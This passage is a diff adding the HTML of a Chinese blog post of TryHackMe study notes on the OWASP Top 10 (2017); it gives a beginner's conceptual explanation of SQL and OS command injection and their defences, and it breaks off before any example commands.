@@ -1,0 +1,2394 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Hekeatsll">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2024/01/27/thm-owasp top 10(2017版)-学习/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="了解并利用每个OWASP Top 10漏洞，它们是十大最严重的Web安全风险。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="THM-OWASP Top10(2017版)-学习">
+<meta property="og:url" content="http://example.com/2024/01/27/THM-OWASP%20Top%2010(2017%E7%89%88)-%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="了解并利用每个OWASP Top 10漏洞，它们是十大最严重的Web安全风险。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/articleimg/image-20221129220611499.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221205235710045.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221201174453578.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221201191620410.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221203184144289.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221203184256414.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221203184333130.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221203184423876.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221203184654131.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221203184721887.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221203184953287.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221203185142815.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221203185553421.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221203185812892.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221203195339601.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221203200121330.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221203200241739.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221203200307678.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221203200404832.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221203200437726.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221203200502403.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221203223336491.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221203223516357.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221203223657467.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221203224039023.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221203225245851.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221203225511295.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221203230018507.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221204191557968.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221204191855964.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221204191939098.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221204192050796.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221204192411223.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221204192733787.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221204192841587.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221204193007000.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221204193046169.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221204193850941.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221204223418751.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221204235609263.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221205111742729.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221205112504755.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221205112734898.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221205190226634.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221205190347909.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221205191515365.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221205190725517.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221205190035962.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221205191357202.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221205191242778.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221205112914400.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221205121133524.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221205192842586.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221205194722934.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221205194749516.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221205194844060.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221205200748825.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221205205103801.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221205211241697.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221205211409131.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221205211541267.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221205211630960.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221205223354015.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221205230328062.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221205230434516.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221205230649858.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221205230552515.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221205230729646.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221205230748169.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221205230807046.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221205230910716.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221205231009442.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221205231235282.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221205231306286.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221205231321702.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221205231513004.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221205231829102.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221205234852246.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221206235215817.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207080331427.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207081346257.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207081523717.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207081911048.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207083619301.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207084956109.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207090734279.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207093801602.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207093837451.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207094203679.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207094233129.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207094417615.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207094605184.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207095944461.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207151136620.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207151215577.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207151232692.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207151446303.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207151648417.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207151730728.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207151819237.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207152555143.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207152722157.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207153718508.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207154218107.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207154725552.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207155331116.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207155919908.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207160302850.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207160531109.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207160616402.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207160723115.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207160901060.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207161146842.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207161312676.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207162549336.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207163535284.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207164140555.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207163952013.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207164207319.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207164305760.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207164914268.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207171014001.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207171639350.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207171908610.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207172421592.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207172547885.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207173910294.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207183040245.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207183407087.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207183637612.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207184053851.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207192855705.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207192913323.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221207192955916.png">
+<meta property="article:published_time" content="2024-01-27T04:45:55.000Z">
+<meta property="article:modified_time" content="2024-01-27T05:33:22.661Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="TryHackMe">
+<meta property="article:tag" content="Web安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/articleimg/image-20221129220611499.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/20240103084029.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/20240103084029.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/20240103084029.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            THM-OWASP Top10(2017版)-学习 -
+        
+        Hekeats-Limited Lyric
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    
+        <style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    
+<script src="/js/libs/anime.min.js"></script>
+
+    <h1 class="ml13">
+        Hekeats-Limited Lyric
+    </h1>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+
+        anime.timeline({loop: true})
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [100,0],
+                translateZ: 0,
+                opacity: [0,1],
+                easing: "easeOutExpo",
+                duration: 1400,
+                delay: (el, i) => 300 + 30 * i
+            }).add({
+            targets: '.ml13 .letter',
+            translateY: [0,-100],
+            opacity: [1,0],
+            easing: "easeInExpo",
+            duration: 1200,
+            delay: (el, i) => 100 + 30 * i
+        });
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            hidePreloaderAfterTimeout(1000); // Hide after 1000 milliseconds once the window has loaded
+        });
+
+        // Backup failsafe: Hide preloader after a maximum of 5000 milliseconds, regardless of the window load event
+        hidePreloaderAfterTimeout(5000);
+
+        function hidePreloaderAfterTimeout(delay) {
+            setTimeout(function () {
+                var preloader = document.querySelector('.preloader');
+                preloader.style.opacity = '0';
+                setTimeout(function () {
+                    preloader.style.display = 'none';
+                }, 200);
+            }, delay);
+        }
+    </script>
+</div>
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    <!--- Font Part-->
+    
+    
+    
+        <link href="" rel="stylesheet">
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":5,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":true,"family":"Noto Sans SC","url":null},"english":{"enable":false,"family":null,"url":"https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700&display=swap"}},"content_max_width":"1000px","sidebar_width":"350px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-o57z3m.jpg","dark":"/images/wallhaven-28m68g.jpg"},"title":"Hekeats-Limited Lyric","subtitle":{"text":["死亡无时无刻不围绕在我们身边，然而我们依旧挥霍着时间，以为生命 享之不尽⌛️"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/Hekeatsll/","instagram":null,"zhihu":null,"twitter":"https://twitter.com/Hekeatsll","email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":5},"tags":{"enable":true,"limit":5}},"footerStart":"2024/1/16 0:30:30"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Hekeats-Limited Lyric
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">8</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">1</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">45</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                
+                
+                <img src="https://i.imgur.com/sP6d0iZ.png" alt="THM-OWASP Top10(2017版)-学习" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75"/>
+                
+                <div class="w-full flex items-center absolute bottom-0 justify-start">
+                    <h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-bold backdrop-blur-lg rounded-xl border border-border-color ">THM-OWASP Top10(2017版)-学习</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/20240103084029.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Hekeatsll</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-01-27 12:45:55</span>
+        <span class="mobile">2024-01-27 12:45:55</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-01-27 13:33:22</span>
+            <span class="mobile">2024-01-27 13:33:22</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/TryHackMe%E7%AC%94%E8%AE%B0/">TryHackMe笔记</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/TryHackMe/">TryHackMe</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Web%E5%AE%89%E5%85%A8/">Web安全</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>15.7k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>57 Mins</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <p>本文相关的TryHackMe实验房间链接：<a class="link"   target="_blank" rel="noopener" href="https://tryhackme.com/room/owasptop10" >https://tryhackme.com/room/owasptop10 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>通过学习相关知识点：了解并利用每个OWASP Top 10漏洞，它们是十大最严重的Web安全风险。</p>
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221129220611499.png"
+                      alt="image-20221129220611499"
+                ></p>
+<p>本文知识点是为初学者而设计的，假设阅读本文的人员之前没有接触过任何安全相关知识。</p>
+<p>本文所涉及的知识点如下(相关的知识点只是基础知识点，如果你想深入了解OWASP TOP 10或者进行web漏洞挖掘工作，那么你还需要进一步的学习和练习)：</p>
+<ul>
+<li>Injection（注入漏洞）</li>
+<li>Broken Authentication（存在缺陷的身份验证机制）</li>
+<li>Sensitive Data Exposure（敏感信息泄露）</li>
+<li>XML External Entity（XML外部实体注入-XXE漏洞）</li>
+<li>Broken Access Control（存在缺陷的访问控制机制）</li>
+<li>Security Misconfiguration（安全性配置错误）</li>
+<li>Cross-site Scripting（跨站脚本漏洞-XSS漏洞）</li>
+<li><strong>I</strong>nsecure Deserialization（不安全的反序列化-反序列化漏洞）</li>
+<li>Components with Known Vulnerabilities（具有已知漏洞的组件）</li>
+<li>Insufficent Logging &amp; Monitoring（日志记录和监控不足）</li>
+</ul>
+<p><em><strong>本文使用的是OWASP TOP 10的2017年标准</strong></em>。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221205235710045.png"
+                      alt="image-20221205235710045"
+                ></p>
+<blockquote>
+<p>关于OWASP-TOP10的介绍：<a class="link"   target="_blank" rel="noopener" href="https://www.safedog.cn/news/5092.html" >https://www.safedog.cn/news/5092.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</blockquote>
+<h2 id="严重程度TOP1-注入"><a href="#严重程度TOP1-注入" class="headerlink" title="[严重程度TOP1] 注入"></a>[严重程度TOP1] 注入</h2><p>注入漏洞在当今的应用中非常普遍，之所以出现这些漏洞 是因为web应用程序会将用户所控制的输入数据解释为实际的命令或参数；注入攻击取决于当前web应用程序正在使用的技术以及这些技术会如何准确解释用户所输入的数据，一些常见的例子包括:</p>
+<ul>
+<li>SQL注入:当用户控制的输入数据被传递给后端的SQL查询语句时，就会发生SQL注入；通过利用该漏洞，攻击者可以传入SQL查询语句来操纵针对目标数据库的查询行为并获取到相关查询结果。</li>
+<li>命令注入:当用户的输入被传递成为系统命令时，就会发生命令注入；通过利用该漏洞，攻击者能够在web应用服务器上执行任意的系统命令。</li>
+</ul>
+<p>如果攻击者能够成功地传递一些 会被web应用程序正确解释的输入数据，他们将能够做以下事情:</p>
+<ul>
+<li>当用户输入能被传递到数据库查询时，攻击者可以访问、修改和删除数据库中的数据信息；这意味着攻击者可以窃取个人详细信息和用户凭证等敏感信息。</li>
+<li>攻击者可以在目标服务器上执行任意系统命令，这将允许攻击者访问 服务器用户所对应的权限级别下 的系统文件；然后攻击者就能够窃取敏感数据，并能对与 执行恶意命令的服务器 相链接的基础设施进行更多攻击。</li>
+</ul>
+<p>防止注入攻击的主要防御措施是确保用户所控制的输入数据不会被解释为查询语句或有效命令，有几种不同的方法:</p>
+<ul>
+<li>使用允许列表(白名单)：当用户提供的输入被发送到服务器时，此输入将会与安全输入或字符列表进行比较。如果用户所提供的输入数据被标记为安全的，那么它将被允许通过；否则，用户所提供的输入数据将被拒绝通过，应用程序此时也将抛出一个错误提示。</li>
+<li>过滤用户所输入的数据：如果用户所提供的输入中包含某些危险字符，那么应用程序会首先将这些危险字符清除，然后再继续进行处理。</li>
+</ul>
+<p>危险字符或危险输入会被归类为任何可能改变基础数据处理方式的外部输入，除了手动构造允许列表或仅仅清除输入数据之外，还有各种函数库可以帮助你执行防注入操作。</p>
+<h2 id="严重程度TOP1-操作系统命令注入"><a href="#严重程度TOP1-操作系统命令注入" class="headerlink" title="[严重程度TOP1] 操作系统命令注入"></a>[严重程度TOP1] 操作系统命令注入</h2><p>当web应用程序中的服务器端代码(如PHP代码)在宿主机上进行系统调用时，就可能会发生命令注入，这是一个web漏洞，该漏洞将允许攻击者利用其所构造的系统调用在服务器上执行任意操作系统命令。</p>
+<p>有时，命令注入并不总是恶意的，比如执行 <em><strong>whoami</strong></em> 命令或者简单地执行 <em><strong>读取文件</strong></em> 命令；但是命令注入漏洞能为攻击者提供很多选择以进行漏洞利用，攻击者所能做的最糟糕的事情是利用命令注入漏洞来产生一个反向shell，并获得web服务器运行时所对应的用户权限。</p>
